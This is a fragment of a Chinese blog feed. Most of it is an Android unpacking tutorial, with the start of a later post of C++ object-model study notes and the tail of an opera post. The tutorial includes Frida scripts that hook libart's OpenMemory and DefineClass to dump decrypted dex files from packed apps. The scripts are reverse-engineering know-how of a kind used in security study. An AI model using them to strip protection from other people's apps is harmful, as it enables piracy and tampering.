&lt;p&gt;陈世美考中一品状元、做了当朝驸马之后，宁愿死也不愿意与旧妻相认。秦香莲来到驸马府之后，陈世美也吓了一跳，也思考，也难过，但是几经纠结之后拒绝认妻。然后秦香莲去找王延龄，王延龄是当朝国老，包拯的恩师，宁愿官
      
    
    </summary>
    
    
      <category term="听戏" scheme="https://github.com/Cracke-S-J/categories/opera/"/>
    
    
      <category term="京剧" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%AC%E5%89%A7/"/>
    
  </entry>
  
  <entry>
    <title>Android脱壳入门</title>
    <link href="https://github.com/Cracke-S-J/2019/06/20/easy-android-unpack/"/>
    <id>https://github.com/Cracke-S-J/2019/06/20/easy-android-unpack/</id>
    <published>2019-06-20T06:36:05.000Z</published>
    <updated>2019-07-24T15:39:34.716Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是hook"><a href="#什么是hook" class="headerlink" title="什么是hook"></a>什么是hook</h2><p>hook是钩子的意思，怎么解释我在面试的时候也没答好，现在也不会描述，只能自行体会。android hook大致有下面三种，然后还有一个进程注入。</p><ol><li><a href="https://www.cnblogs.com/mmmmar/p/8228391.html" target="_blank" rel="noopener">Android GOT Hook</a></li><li><a href="https://www.cnblogs.com/mmmmar/p/8185549.html" target="_blank" rel="noopener">Android Inline Hook</a></li><li><a href="https://www.cnblogs.com/mmmmar/p/8227915.html" target="_blank" rel="noopener">Android Exception Hook</a></li><li><a href="https://www.cnblogs.com/mmmmar/p/8253537.html" target="_blank" rel="noopener">Android Ptrace Inject</a></li></ol><h2 id="frida的使用"><a href="#frida的使用" class="headerlink" title="frida的使用"></a>frida的使用</h2><p><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80372118" target="_blank" rel="noopener">Android逆向之旅—Hook神器家族的Frida工具使用详解</a></p><p>四哥写的，CSDN，丑点就丑点，内容还是很好的。</p><h2 id="Dex加载流程（基于Android5-1）"><a href="#Dex加载流程（基于Android5-1）" class="headerlink" title="Dex加载流程（基于Android5.1）"></a>Dex加载流程（基于Android5.1）</h2><h3 id="DexClassloader"><a href="#DexClassloader" class="headerlink" title="DexClassloader"></a>DexClassloader</h3><p>要动态加载一个dex文件，用到的是DexClassloader，DexClassloader是BaseDexClassLoader的子类，代码很短。</p><h3 id="BaseClassloader"><a href="#BaseClassloader" class="headerlink" title="BaseClassloader"></a>BaseClassloader</h3><p>BaseClassloader是Classloader的子类。Classloader有两个比较重要的方法：findClass和loadClass。其中findClass是用来实现类加载的逻辑，loadClass是先从父Classloader里面去寻找，如果找不到就调用自己的findClass来找。需要关注的是BaseClassloader的构造方法和findClass方法。在构造方法中，将自己的pathList这个成员变量赋值，其值是一个新创建的DexPathList对象。在findClass方法中是调用的pathList里面的findClass方法，所以dex加载的逻辑应该是在DexPathList里面实现的。</p><h3 id="DexPathList"><a href="#DexPathList" class="headerlink" title="DexPathList"></a>DexPathList</h3><p>在DexPathList里面需要关注三个函数:构造方法、findClass和makeDexElements。findClass是用来找类的，其代码里面是从自己的dexElements去找的类。构造方法中调用makeDexElements这个方法类给dexElements来赋值的。在makeDexElements这个类里面，就是将apk或者zip或者jar或者裸的dex加载起来，放到Elements对象里面。dexFile就是放到这个element里面，在makeDexElements里面是调用的自身的loadDexFile来加载dex，在loadDexFile里面判断了文件是否是zip或者apk jar，如果是就调用构造方法来加载dex，否则就使用loadDex方法来加载dex。</p><h3 id="DexFile"><a href="#DexFile" class="headerlink" title="DexFile"></a>DexFile</h3><p>DexFile这个类就是java层最终加载dex的类，在构造方法中调用的openDexFile方法来加载dex，openDexFile是调用的openDexFileNative方法来加载dex，这个方法是一个native方法。其实现在dalvik_system_DexFile.cc中。</p><h3 id="dalvik-system-DexFile-cc"><a href="#dalvik-system-DexFile-cc" class="headerlink" title="dalvik_system_DexFile.cc"></a>dalvik_system_DexFile.cc</h3><p>在DexFile.java中调用的openDexFileNative的实现就在dalvik_system_DexFile.cc中的DexFile_openDexFileNative函数里面。这里是由class_inker.cc的OpenDexFilesFromOat来实现的。</p><h3 id="class-linker-cc"><a href="#class-linker-cc" class="headerlink" title="class_linker.cc"></a>class_linker.cc</h3><p>查看当前dex文件是否被解析成oat，如果被解析成了oat文件，就直接下一步，如果没有就先调用dex2oat把dex解析成oat文件。</p><h2 id="跟踪dex加载流程"><a href="#跟踪dex加载流程" class="headerlink" title="跟踪dex加载流程"></a>跟踪dex加载流程</h2><p><code>frida-trace -R -f [包名] -i &quot;*OatFile*&quot; -i &quot;*DexFile*&quot;</code></p><p>用frida跟踪加载流程，由于C++编译的函数符号会带有命名空间，所以一般关注OatFile和DexFile即可。将符号还原为函数名，就可以知道加载流程了。</p><h2 id="脱一代壳"><a href="#脱一代壳" class="headerlink" title="脱一代壳"></a>脱一代壳</h2><p>一代壳是将整个dex加密，加载时动态解密，有很多方案可以脱掉。更Low一点的是落地加载，pull出来就行了。</p><ol><li>内存遍历，找dex，把dex抠出来。</li><li>hook从内存中打开dex的函数OpenMemory或者其它合适的。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">dumpdexmemory = <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dex_len = Memory.readU32(addr.add(<span class="number">0x20</span>));</span><br><span class="line">    <span class="keyword">var</span> buf = Memory.readByteArray(addr, <span class="number">64</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(hexdump(buf, &#123;</span><br><span class="line">      offset: <span class="number">0</span>,</span><br><span class="line">      length: <span class="number">64</span>,</span><br><span class="line">      header: <span class="literal">true</span>,</span><br><span class="line">      ansi: <span class="literal">true</span></span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="keyword">var</span> dumppath = <span class="string">"/sdcard/frida-unpack/"</span> + dex_len.toString(<span class="number">0x10</span>) + <span class="string">".dex"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(dumppath);</span><br><span class="line">    <span class="keyword">var</span> dumpdexfile = <span class="keyword">new</span> File(dumppath, <span class="string">"wb"</span>);</span><br><span class="line">    dumpdexfile.write(Memory.readByteArray(addr, dex_len));</span><br><span class="line">    dumpdexfile.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"write file to "</span> + dumppath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openmemory = Module.findExportByName(<span class="string">"libart.so"</span>, <span class="string">"_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_"</span>);</span><br><span class="line"><span class="keyword">if</span>(openmemory != <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"openmemory at "</span> + openmemory);</span><br><span class="line">    Interceptor.attach(openmemory, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"loaddex: "</span> + args[<span class="number">1</span>] + <span class="string">"  size: "</span> + args[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">if</span>(Memory.readU32(args[<span class="number">1</span>]) == DEX_MAGIC) &#123;</span><br><span class="line">                dexrec.push(args[<span class="number">1</span>]);</span><br><span class="line">                dumpdexmemory(args[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"dexfile: "</span> + retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="脱二代壳"><a href="#脱二代壳" class="headerlink" title="脱二代壳"></a>脱二代壳</h2><p>手动触发功能，然后调用dumpdex()得到dex。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> DEX_MAGIC = <span class="number">0x0A786564</span>;</span><br><span class="line"><span class="keyword">var</span> dexrec = [];</span><br><span class="line"></span><br><span class="line">dumpdexmemory = <span class="function"><span class="keyword">function</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> dex_len = Memory.readU32(addr.add(<span class="number">0x20</span>));</span><br><span class="line">    <span class="keyword">var</span> buf = Memory.readByteArray(addr, <span class="number">64</span>);</span><br><span class="line">    <span class="comment">// console.log(hexdump(buf, &#123;</span></span><br><span class="line">    <span class="comment">//   offset: 0,</span></span><br><span class="line">    <span class="comment">//   length: 64,</span></span><br><span class="line">    <span class="comment">//   header: true,</span></span><br><span class="line">    <span class="comment">//   ansi: true</span></span><br><span class="line">    <span class="comment">// &#125;));</span></span><br><span class="line">    <span class="keyword">var</span> dumppath = <span class="string">"/sdcard/frida-unpack/"</span> + dex_len.toString(<span class="number">0x10</span>) + <span class="string">".dex"</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(dumppath);</span><br><span class="line">    <span class="keyword">var</span> dumpdexfile = <span class="keyword">new</span> File(dumppath, <span class="string">"wb"</span>);</span><br><span class="line">    dumpdexfile.write(Memory.readByteArray(addr, dex_len));</span><br><span class="line">    dumpdexfile.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"write file to "</span> + dumppath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dexAddrs = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">var</span> cnt = <span class="number">0</span>;</span><br><span class="line">dumpdex = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cnt; ++i)&#123;</span><br><span class="line">        dumpdexmemory(dexAddrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openmemory = Module.findExportByName(<span class="string">"libart.so"</span>, <span class="string">"_ZN3art7DexFile10OpenMemoryEPKhjRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEjPNS_6MemMapEPKNS_10OatDexFileEPS9_"</span>);</span><br><span class="line"><span class="keyword">if</span>(openmemory != <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"openmemory at "</span> + openmemory);</span><br><span class="line">    Interceptor.attach(openmemory, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.error(<span class="string">"loaddex: "</span> + args[<span class="number">1</span>] + <span class="string">", size: "</span> + args[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">if</span>(Memory.readU32(args[<span class="number">1</span>]) == DEX_MAGIC) &#123;</span><br><span class="line">                dexAddrs[cnt++] = args[<span class="number">1</span>];</span><br><span class="line">                dexrec.push(args[<span class="number">1</span>]);</span><br><span class="line">                dumpdexmemory(args[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"dexfile: "</span> + retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DefineClass = Module.findExportByName(<span class="string">"libart.so"</span>, <span class="string">"_ZN3art11ClassLinker11DefineClassEPNS_6ThreadEPKcjNS_6HandleINS_6mirror11ClassLoaderEEERKNS_7DexFileERKNS9_8ClassDefE"</span>);</span><br><span class="line"><span class="keyword">if</span>(DefineClass != <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"DefineClass at "</span> + DefineClass);</span><br><span class="line">    Interceptor.attach(DefineClass, &#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> descriptor = Memory.readUtf8String(args[<span class="number">2</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"dexfile: "</span> + args[<span class="number">5</span>] + <span class="string">", classdef: "</span> + args[<span class="number">6</span>] + <span class="string">", descriptor: "</span> + descriptor);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是hook&quot;&gt;&lt;a href=&quot;#什么是hook&quot; class=&quot;headerlink&quot; title=&quot;什么是hook&quot;&gt;&lt;/a&gt;什么是hook&lt;/h2&gt;&lt;p&gt;hook是钩子的意思，怎么解释我在面试的时候也没答好，现在也不会描述，只能自行体会。android 
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="脱壳" scheme="https://github.com/Cracke-S-J/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>《深度探索Cpp对象模型》学习笔记</title>
    <link href="https://github.com/Cracke-S-J/2019/06/18/cpp-object/"/>
    <id>https://github.com/Cracke-S-J/2019/06/18/cpp-object/</id>
    <published>2019-06-18T05:30:05.000Z</published>
    <updated>2019-07-01T09:49:03.775Z</updated>
    
    <content type="html"><![CDATA[<p>参考自<a href="https://www.cnblogs.com/qiaozhoulin/p/5227690.html" target="_blank" rel="noopener">这个大佬</a>, 拜读后手抄了一遍。</p><hr><h2 id="第一章-关于对象"><a href="#第一章-关于对象" class="headerlink" title="第一章 关于对象"></a>第一章 关于对象</h2><h3 id="class封装之后的布局成本"><a href="#class封装之后的布局成本" class="headerlink" title="class封装之后的布局成本"></a>class封装之后的布局成本</h3><p>class并没有增加成本，data members直接内含在每一个class object之中，就像C的struct一样。而member functions虽然被包含在class的声明之内，但是不出现在Object之中。每一个non-inline function只会产生一个函数实体。至于inline function则会在每一个调用使用的地方产生一个函数实体。</p><p>class在布局以及存取时间上主要的额外负担是由<strong>virtual</strong>引起，包括：</p><ul><li>virtual function机制，用以支持一个有效率的<strong>执行期绑定（runtime binding)</strong>。</li><li>virtual base class用以实现<strong>多次出现在继承体系中的 base class ,有一个单一的被共享的实体</strong>。</li><li>还有一些多继承下的额外负担，发生在<strong>一个derived class和其第二或后继之base class的转换</strong>之间。</li></ul><h3 id="C-对象模型"><a href="#C-对象模型" class="headerlink" title="C++ 对象模型"></a>C++ 对象模型</h3><p>在C++对象模型中，nonstatic data members被放置在每一个class object之内，static data members则被存放在所以class object之外。static和nonstaitc function也被放在所有class object之外。virtual functions 则以两个步骤支持之：</p><ol><li>每一个class产生出一堆指向virtual functions的指针，放在表格之中，这个表格被称为virtual table(vtbl)。</li><li>每一个class object被添加一个指针，指向相关的virtual table。通常这个指针被称为vptr，vptr的设定和重置都由每一个class的constructor、destructor和copy assignment运算符自动完成。</li></ol><p>C++ 以下列方法支持多态：</p><ol><li>经由一组隐含的转化操作。例如把一个derived class指针转换为一个指向其public base type的指针。</li><li>经由virtual function机制。</li><li>经由dynamic_cast和typied运算符。</li></ol><p>class object需要多少内存：</p><ol><li>其nonstatic data members的总和大小。</li><li>加上任何由于alignment和padding（内存对齐）需要的空间。</li><li>加上为了支持virtual而由内部产生的任何额外负担。</li></ol><p>指针类型：告诉编译器如何解释某个特定地址中的内存内容及其大小（例如：一个string是传统的8byte（包括一个4byte的字符指针和一个用来表示字符串长度的整数）。转型（cast)其实是一个编译指令，大部分不会改变一个指针所含有的真正地址，它只影响<strong>被指出值内存的大小和其内容</strong>的解释方式。</p><hr><h2 id="第二章-构造函数语意学"><a href="#第二章-构造函数语意学" class="headerlink" title="第二章 构造函数语意学"></a>第二章 构造函数语意学</h2><h3 id="Default-Constructor"><a href="#Default-Constructor" class="headerlink" title="Default Constructor"></a>Default Constructor</h3><p>当编译器需要的时候，default constructor会被合成出来，只执行编译器所需要的任务（将members适当初始化）。</p><h4 id="带有Default-Constructor的Member-Class-Object。"><a href="#带有Default-Constructor的Member-Class-Object。" class="headerlink" title="带有Default Constructor的Member Class Object。"></a>带有Default Constructor的Member Class Object。</h4><p>编译器的出来是：如果一个class A内含一个或者一个以上member class objects ，那么class A的每一个 constructor必须调用每一个member classes的default constructor。编译器会扩张已存在的constructors,在其中安插一些代码，使得user code在被执行之前，先调用（调用顺序与member objects在class的声明次序一致）必要的default constructors。</p><h4 id="带有Default-Constructor的Base-class"><a href="#带有Default-Constructor的Base-class" class="headerlink" title="带有Default Constructor的Base class"></a>带有Default Constructor的Base class</h4><p>编译器会在Member Class Object的default constructor被插入调用之前，调用（调用次序根据他们的声明次序）所有base class constructor的default constructor。</p><h4 id="带有一个-Virtual-Function的class"><a href="#带有一个-Virtual-Function的class" class="headerlink" title="带有一个 Virtual Function的class"></a>带有一个 Virtual Function的class</h4><p>下面两种情况同样需要合成default constructor：</p><ol><li>class 声明（或继承）一个virtual function。</li><li>class派生自一个继承串链，其中一个或者更多的virtual base class。</li></ol><p>扩展（constructor）操作会在编译期间发生：</p><ol><li>一个virtual function table会被编译器产生出来，内放class的virtual functions的地址。</li><li>在每一个class object中，一个额外的pointer member（vptr)会被编译器合成出来，内含相关的class vtbl的地址。</li></ol><h4 id="带有一个Virtual-Base-Class的class"><a href="#带有一个Virtual-Base-Class的class" class="headerlink" title="带有一个Virtual Base Class的class"></a>带有一个Virtual Base Class的class</h4><p>Virtual base class的实现法在不同编译器之间有很大差异，然而，每一个实现的共同点在于必须使virtual base class在其每一个derived class object中的位置，能够在执行期准备妥当。对于class所定义的每一个constructor编译器都会安插那些<strong>允许每一个virtual base class 的执行期存取操作</strong>的码。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上四种情况，会导致<strong>编译器必须为未声明constructor的class合成一个default constructor</strong>，这只是编译器（而非程序）的需要。它之所以能够完成任务，是借着<strong>调用member object或base class的default constructor</strong>或是<strong>为每一个object初始化其virtual function机制或virtual base class机制</strong>完成。至于没有存在这四种情况而又没有生命constructor的class实际上是不会被合成出来的。</p><p>在合成的default constructor中，只有base class subobjects(子对象）和member class objects会被初始化。所有其他的nonstatic data member，如整数，整数指针，整数数组等是不会被初始化的，这些初始化操作对程序是必须的，但对编译器则并非需要的。</p><p>C++新手会有两个误解：</p><ol><li>任何class如果没有定义default constructor，就会被合成出来一个。</li><li>编译器合成出来的default constructor会明确设定class内每一个data member的默认值。</li></ol><h3 id="Copy-Constructor"><a href="#Copy-Constructor" class="headerlink" title="Copy Constructor"></a>Copy Constructor</h3><p>有三种情况，会以一个object的内容作为另一class object的初值。</p><ol><li>最明显的当然是对一个object做明确的初始化操作。</li><li>当object被当做参数交给某个函数。</li><li>当函数返回一个class object。</li></ol><p>这三种情况需要有copy constructor。</p><h4 id="Default-Memberwise-Initialization"><a href="#Default-Memberwise-Initialization" class="headerlink" title="Default Memberwise Initialization"></a>Default Memberwise Initialization</h4><p>如果class没有提供一个explicit copy constructor时，当class object以相同的另一个object作为初值时，其内部是以所谓的default memberwise initialization方式完成的。也就是把每一个内建的或派生的 data member（例如一个数组或指针）的值，从某个object拷贝一份到另一个object上，但不拷贝其具体内容。例如只拷贝指针地址，不拷贝一份新的指针指向的对象，这也就是浅拷贝，不过它并不会拷贝其中member class object，而是以递归的方式实行memberwise initialization。</p><p>就是Bitwise Copy Semantics和default copy constructor。如果class展现了Bitwise Copy Semantics，则使用bitwise copy（bitwise copy semantics编译器生成的伪代码是memcpy函数），否则编译器会生成default copy constructor。</p><p>那什么情况下class不展现Bitwise Copy Semantics呢？有四种情况：</p><ol><li>当class内含有一个member class object，而这个member class内有一个默认的copy构造函数，（不论是class设计者明确声明，或者被编译器合成）。</li><li>当class继承自一个base class，而base class有copy构造函数（不论是class设计者明确声明，或者被编译器合成）。</li><li>当一个类声明了一个或多个virtual函数。</li><li>当class派生自一个继承串链，其中一个或者多个virtual base class。</li></ol><p>在前2种情况下，编译器必须将member或者base class的copy constructor的调用操作安插到被合成的copy constructor中。</p><p>第3种情况下，因为class 包含virtual function，编译时需要做扩张操作：</p><ol><li>增加virtual function table，内含有一个有作用的virtual function的地址；</li><li>创建一个指向virtual function table的指针，安插在class object内。</li></ol><p>所以，编译器对于每一个新产生的class object的vptr都必须被正确地赋值，否则将跑去执行其他对象的function了，其后果是很严重的。因此，编译器导入一个vptr到class之中时，该class就不在展现bitwise semantics，必须合成copy Constructor并将vptr适当地初始化。</p><p>virtual base class的存在需要特别处理。一个class object如果以另一个virtual base class subobject那么也会使bitwise copy semantics失效。</p><p>每一个编译器对于虚拟继承的支持承诺，都是表示必须让derived class object中的virtual base class subobject位置在执行期就准备妥当，维护位置的完整性是编译器的责任。Bitwise copy semantics 可能会破坏这个位置，所以编译器必须自己合成出copy constructor。</p><p>这也就是说，拷贝构造函数和默认构造器一样，需要的时候会进行构建，而并非程序员不写编译器就帮着构建。</p><h3 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h3><p>下面四种情况必须使用初始化列表来初始化class的成员：</p><ol><li>当初始化一个reference member时；</li><li>当初始化一个const member时；</li><li>当调用一个base class的constructor ，而它拥有一组参数（其实就是自定义的构造函数）时；</li><li>当调用一个member class的constructor，而它拥有一组参数时。</li></ol><p>不过，初始化的顺序是class members声明次序决定的，不是由初始化列表决定的。</p><h2 id="第三章-Data-语意学"><a href="#第三章-Data-语意学" class="headerlink" title="第三章 Data 语意学"></a>第三章 Data 语意学</h2><h3 id="Data-Member的布局"><a href="#Data-Member的布局" class="headerlink" title="Data Member的布局"></a>Data Member的布局</h3><p>nonstatic data members在class object中的排列顺序将和其声明的顺序一样的。但C++ standard允许编译器将多个access sections之中的data members自由排列，不必在乎他们的出现在class中的声明顺序。</p><h3 id="Data-Member的存取"><a href="#Data-Member的存取" class="headerlink" title="Data Member的存取"></a>Data Member的存取</h3><p>每一个member的存取许可（private public protected），以及与class的关联，并不会导致任何空间上或执行时间上的额外负担——不论是在个别的class objects 或是在static data member本身。</p><p>static data members被视为global变量，只有一个实体，存放在程序的data segment之中，每次取static member就会被内部转化为对该唯一的extern实体的直接参考操作。若取一个static data member的地址，会得到一个数据类型的指针，而不是只想起class member的指针。</p><p>nonstatic data members欲对一个nonstatic data member进行存取操作，编译器需要吧class object的起始地址加上data member的偏移量（在编译事情就可以获知）。</p><h3 id="继承与Data-Member"><a href="#继承与Data-Member" class="headerlink" title="继承与Data Member"></a>继承与Data Member</h3><h4 id="只要继承不要多态"><a href="#只要继承不要多态" class="headerlink" title="只要继承不要多态"></a>只要继承不要多态</h4><p>这种情况并不会增加空间或存储时间上的额外负担。这种情况base class和derived class的objects都是从相同的地址开始，其差异只在于derived object比较大，用以容纳自建的nonstatic data members，把一个derived class object指定给base class的指针或引用，并不需要编译器去调停或修改地址，它很滋润的可以发生，而且提供了最佳执行效率。</p><h4 id="加上多态"><a href="#加上多态" class="headerlink" title="加上多态"></a>加上多态</h4><p>这种情况会带来空间和存取时间的额外负担：</p><ol><li>导入一个和virtual table，用来存储它所声明的每一个virtual functions的地址。</li><li>在每一个class object中导入一个vptr,提供执行期的链接，使每一个object能够找到相应的virtual table。</li><li>加强constructor，使它能够为vptr设定初始值，让它指向class 所对应的virtual table 。</li><li>加强destructor，使它能够消抹指向class 相关virtual table的vptr。</li></ol><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>对于一个多重派生对象，将其地址指定给“最左端（第一个）base class的指针”，情况和单一继承时相同，因为二者都指向了相同的起始地址，至于第二个或后面的base class 的地址指定操作，则需要将地址修改过：加上（或减去，如果是downcast）介于中间的base class subobject(s)的大小。</p><p>如果要存取第二个（或后面）的base class 中的一个data member ，不需要付出额外的成本，因为members的位置在编译时就固定了，因此存取member只是一个简单的offset的运算。</p><h4 id="虚拟继承"><a href="#虚拟继承" class="headerlink" title="虚拟继承"></a>虚拟继承</h4><p>class如果含有一个或多个virtual base class subobjects将被分割为两部分：一个不变局部和一个共享局部。不变局部中的数据，总是能有固定的offset，这部分可以被直接存取，至于共享部分，所表现的就是virtual base class subobject ，这个部分数据，其位置因为每次派生操作而有变化，所以只能间接存取。</p><p>如果没有virtual functions的情况下，它们和C struct完全一样。</p><h2 id="第四章-Function-语意学"><a href="#第四章-Function-语意学" class="headerlink" title="第四章 Function 语意学"></a>第四章 Function 语意学</h2><h3 id="Member的各种调用方式"><a href="#Member的各种调用方式" class="headerlink" title="Member的各种调用方式"></a>Member的各种调用方式</h3><p>Nonstatic Member Functions</p><p>实际上编译器是将member function被内化为nonmember的形式，经过下面转化步骤：</p><p>1.给函数添加额外参数，this。<br>2.将对每一个nonstaitc data member的存取操作改为this指针来存取。<br>3.将member function重写成一个外部函数。对函数名精选mangling处理，使之成为独一无二的语汇。</p><h4 id="Virtual-Member-Functions"><a href="#Virtual-Member-Functions" class="headerlink" title="Virtual Member Functions"></a>Virtual Member Functions</h4><p>将</p><p><code>ptr-&gt;f();   //f()为virtual member function</code></p><p>内部转化为</p><p><code>（*ptr-&gt;vptr[1](ptr);</code></p><p>其中：</p><p>vptr表示编译器产生的指针，指向virtual table。它被安插在每一个声明有（或继承自）一个或多个virtual functions 的class object中。</p><p>一是virtual table slot的索引值，关联到normalize()函数。</p><p>二是ptr表示this指针。</p><h4 id="Static-Member-Functions"><a href="#Static-Member-Functions" class="headerlink" title="Static Member Functions"></a>Static Member Functions</h4><p>不能被声明为const volatile或virtual。</p><p>一个static member function会提出于class声明之外，并给予一个经过mangling的适当名称。如果取一个static member function 的地址，获得的是其在内存的位置也就是地址，而不是一个指向class member function的指针，如下：</p><p><code>&amp;Point::count();</code></p><p>会得到一个数值，类型是：</p><p><code>unsigned int(*)();</code></p><p>而不是：</p><p><code>unsigned int(Point::*)();</code></p><h3 id="Virtual-Member-Funcitons"><a href="#Virtual-Member-Funcitons" class="headerlink" title="Virtual Member Funcitons"></a>Virtual Member Funcitons</h3><p>C++中，多态表示以一个public base class 的指针（或reference)，寻址出一个derived class object。</p><p>每一个class 只会有一个virtual table，每一个table含有对应的class object中所有active virtual functions 函数实体地址。这些active virtual function包括：</p><ol><li>这个class 所定义的函数实体（改写（overriding)一个可能存在的base class virtual function函数实体。</li><li>继承自base class 的函数实体（不被derived class改写）</li><li>一个pure_virtual_called()。</li></ol><p>一个类继承函数virtual table的三种可能性：</p><ol><li>继承base class 所声明的virtual functions的函数实体。正确地说，是该函数实体的地址会被拷贝到derived class的virtual table相对应的slot之中。</li><li>使用自己的函数实体。这表示它自己的函数实体地址必须放在对应的slot之中。</li><li>可以加入一个新的virtual function。这时候virtual table 的尺寸会增大一个slot放进这个函数实体地址。</li></ol><p>编译时期设定virtual function的调用：</p><p>一般而言，我并不知道ptr 所指对象的真正类型。然而可以经由ptr 可以存取到该对象的virtual table。</p><p>虽然我不知道哪个Z()函数实体被调用，但知道每一个Z()函数地址都被放置slot 4的索引。</p><p>这样我们就可以将</p><p><code>ptr-&gt;z();</code></p><p>转化为：<code>（*ptr-&gt;vptr[4])(ptr);</code></p><p>唯一一个在执行期才能知道的东西是：slot4所指的到底是哪一个z()函数实体。</p><p>多重继承下的 Virtual Functions</p><p>在多重继承中支持virtual functions，其复杂度围绕在第二个及其后面的base class 上，以及“必须在执行期调整this 